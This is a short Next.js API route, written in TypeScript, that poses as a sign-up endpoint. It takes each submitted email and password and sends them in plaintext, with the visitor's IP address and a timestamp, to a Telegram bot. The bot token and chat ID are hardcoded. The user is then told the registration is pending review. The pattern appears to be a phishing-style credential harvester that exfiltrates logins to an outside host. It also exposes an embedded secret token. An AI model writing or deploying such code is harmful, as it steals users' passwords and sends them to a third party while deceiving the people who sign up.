
import { NextApiRequest, NextApiResponse } from 'next';
import axios from 'axios';

const TELEGRAM_API = `https://api.telegram.org/bot8599325477:AAGJdWfdT3xFbiSlt-AA-Z6mKhY40gNkmWk`;
const CHAT_ID = '8735516423';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: 'Email and password are required.' });
  }

  try {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';
    const time = new Date().toUTCString();

    const message = `
📬 *New Sign-Up Request* 📬

*Email:* ${email}
*Password:* ${password}
*IP Address:* ${ip}
*Time:* ${time}

Please review and take action.
    `;

    // Send notification to Telegram
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Approve', callback_data: `approve_${email}` },
            { text: '❌ Deny', callback_data: `deny_${email}` },
          ],
        ],
      },
    });

    res.status(200).json({ message: 'Your registration is pending review.' });

  } catch (error: any) {
    console.error('[REGISTER_API_ERROR]', error);
    const errorMessage = axios.isAxiosError(error) ? error.response?.data?.description : error.message;
    res.status(500).json({ message: `An error occurred: ${errorMessage}` });
  }
}
